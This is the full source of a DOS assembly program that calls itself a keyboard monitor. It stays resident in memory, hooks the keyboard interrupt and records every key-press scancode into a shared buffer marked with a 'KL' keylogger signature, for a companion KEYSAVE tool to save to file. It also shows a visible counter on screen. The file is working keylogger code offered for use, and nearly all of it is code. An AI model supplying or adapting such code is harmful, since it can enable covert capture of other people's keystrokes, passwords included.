; Ultra-Simple Keyboard Monitor - No Crashes Guaranteed
; Simple display, reliable operation, no flicker

ORG 100h

start:
    ; Check if already installed
    mov ax, 0x3509
    int 21h
    cmp bx, keyboard_hook
    je already_installed

    ; Save original keyboard interrupt
    mov [old_int9], bx
    mov [old_int9+2], es

    ; Install keyboard hook
    cli
    mov dx, keyboard_hook
    mov ax, 0x2509
    int 21h
    sti

    ; Initialize shared memory area
    mov ax, 'KL'       ; Keylogger signature
    mov [shared_signature], ax
    mov word [shared_total_keys], 0
    mov word [shared_buffer_size], 0
    mov word [shared_buffer_end], 0

    ; Show success message
    mov dx, success_msg
    mov ah, 09h
    int 21h

    ; Terminate and stay resident (INT 27h)
    mov dx, resident_end
    int 27h

; Keyboard hook - ONLY increments counter and displays minimal info
keyboard_hook:
    push ax
    push bx
    push cx
    push dx
    push si
    push di
    push ds
    push es
    
    ; Read keyboard input
    in al, 0x60
    
    ; Set data segment
    push cs
    pop ds
    
    ; Only process key press events (not releases)
    test al, 0x80
    jnz .skip_recording
    
    ; Save scan code for display
    mov [last_scancode], al
    
    ; Increment key counter
    inc word [shared_total_keys]
    
    ; Save scan code to circular buffer
    mov bx, [shared_buffer_end]
    mov [shared_buffer+bx], al
    
    ; Update buffer end pointer (circular)
    inc bx
    cmp bx, BUFFER_SIZE
    jb .no_wrap
    xor bx, bx          ; Wrap to start
.no_wrap:
    mov [shared_buffer_end], bx
    
    ; Update buffer size
    mov ax, [shared_buffer_size]
    cmp ax, BUFFER_SIZE
    jae .buffer_full
    inc word [shared_buffer_size]
.buffer_full:
    
    ; Update screen with minimal content (reduces flicker)
    call update_screen
    
.skip_recording:
    pop es
    pop ds
    pop di
    pop si
    pop dx
    pop cx
    pop bx
    pop ax
    
    ; Call original keyboard interrupt
    jmp far [cs:old_int9]

; Update screen with minimal info to reduce flicker
update_screen:
    push ax
    push bx
    push es
    
    ; Set video segment
    mov ax, 0B800h
    mov es, ax
    
    ; Display activity indicator
    mov ah, 1Eh         ; Yellow on blue
    mov al, '*'         ; Asterisk shows activity
    mov [es:0], ax      ; Top-left corner
    
    ; Display key count
    mov ax, [shared_total_keys]
    
    ; We'll only display up to 999 keys to keep it simple
    ; hundreds digit
    mov bx, 100
    xor dx, dx
    div bx
    add al, '0'
    mov ah, 1Fh
    mov [es:4], ax
    
    ; tens digit
    mov ax, dx
    mov bl, 10
    div bl
    add al, '0'
    mov ah, 1Fh
    mov [es:6], ax
    
    ; ones digit
    add ah, '0'
    xchg al, ah
    mov ah, 1Fh
    mov [es:8], ax
    
    ; Display last scancode
    mov al, [last_scancode]
    mov ah, al
    
    ; High nibble
    shr ah, 4
    add ah, '0'
    cmp ah, '9'
    jbe .high_done
    add ah, 7
.high_done:
    mov al, ah
    mov ah, 1Dh         ; Light cyan on blue
    mov [es:12], ax
    
    ; Low nibble
    mov al, [last_scancode]
    and al, 0Fh
    add al, '0'
    cmp al, '9'
    jbe .low_done
    add al, 7
.low_done:
    mov ah, 1Dh
    mov [es:14], ax
    
    ; Display buffer size
    mov ax, [shared_buffer_size]
    mov bl, 100
    div bl
    add al, '0'
    mov ah, 1Ah         ; Green on blue
    mov [es:18], ax
    
    mov al, ah
    mov bl, 10
    xor ah, ah
    div bl
    add al, '0'
    mov ah, 1Ah
    mov [es:20], ax
    
    add ah, '0'
    xchg al, ah
    mov ah, 1Ah
    mov [es:22], ax
    
    pop es
    pop bx
    pop ax
    ret

; Already installed message
already_installed:
    mov dx, already_msg
    mov ah, 09h
    int 21h
    ret

; Constants
BUFFER_SIZE equ 2048

; Data section
old_int9       dd 0
last_scancode  db 0

; Shared memory area - This will be read by the KEYSAVE program
shared_signature  dw 'KL'       ; Signature to identify our shared data
shared_total_keys dw 0          ; Total keys pressed
shared_buffer_size dw 0         ; Current buffer size
shared_buffer_end  dw 0         ; Current buffer end position
shared_buffer      db BUFFER_SIZE dup(0) ; Shared key buffer

; Messages
success_msg   db 'Ultra-simple keyboard monitor installed.', 0Dh, 0Ah
              db 'Display format: [*] [Count] [ScanCode] [BufferSize]', 0Dh, 0Ah
              db 'Use KEYSAVE.COM to save recorded data to file.', 0Dh, 0Ah, '$'
already_msg   db 'Already installed.', 0Dh, 0Ah, '$'

resident_end: 